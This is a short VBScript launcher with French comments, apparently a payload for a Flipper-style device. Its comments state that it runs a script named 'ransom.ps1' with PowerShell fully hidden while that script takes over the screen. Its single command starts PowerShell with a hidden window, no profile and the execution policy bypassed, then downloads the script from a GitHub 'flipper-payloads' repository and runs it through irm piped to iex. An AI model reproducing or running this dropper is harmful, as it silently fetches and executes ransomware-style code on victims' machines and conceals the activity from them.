' Lance ransom.ps1 en caché total
' Note : ransom.ps1 affiche lui-même une fenêtre plein écran (c'est le but)
' Mais PowerShell, lui, reste caché.
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w h -NoP -NonI -Exec Bypass -Command ""irm https://raw.githubusercontent.com/timeobonnin-prog/flipper-payloads/main/ransom.ps1 | iex""", 0, False